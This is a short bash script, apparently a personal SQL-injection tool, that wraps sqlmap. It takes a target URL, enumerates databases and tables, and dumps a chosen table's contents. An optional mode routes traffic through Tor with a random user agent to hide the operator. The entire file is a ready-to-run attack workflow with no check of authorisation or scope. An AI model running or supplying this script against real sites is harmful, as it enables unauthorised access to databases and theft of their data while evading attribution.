#!/bin/bash

####
#
# TODO: grep DB + TABLE from output
#
####
echo "###########################################################"
echo "#                  usage: ./squik.sh                      #"
echo "#                                                         #"
echo "#  sql quick is a tool for simple SQL INJECTION testing   #"
echo "#                                                         #"
echo "#Author: Schaiger David                                   #"
echo "###########################################################"
echo ""
echo -n "paste target URL: "
read URL

###########################
#
# BASIC enumeration / anon
#
###########################
echo ""
echo "[!]choose your mode:"
echo "--------------------"
echo "[1] quick enumeration"
echo "[2] anonymity bundle"
echo "[3] exit"

read CHOICE
if [ $CHOICE == 1 ]; then
ANON=""
elif [ $CHOICE == 2 ]; then
ANON="--tor --tor-type=SOCKS5 --tor-port 9050 --check-tor --random-agent"
elif [ $CHOICE == 3 ]; then
exit 0
fi

sqlmap -o $ANON -u $URL --dbs

###########################
#
# DB enumeration
#
###########################
echo ""
echo "--------------------squik"
echo "[1] enumerate DB: "
echo "[2] exit"

read CHOICE

if [ $CHOICE == 1 ]; then
echo ""
echo -n "paste target DB: "
read DB
elif [ $CHOICE == 2 ]; then
exit 0
fi

sqlmap -o $ANON -u $URL --tables -D $DB

###########################
#
# dump TABLE
#
###########################
echo ""
echo "--------------------squik"
echo "[1] dump table: "
echo "[2] exit"

read CHOICE

if [ $CHOICE == 1 ]; then
echo ""
echo -n "paste target TABLE: "
read TABLE
elif [ $CHOICE == 2 ]; then
exit 0
fi

sqlmap -o $ANON -u $URL --dump -T $TABLE -D $DB


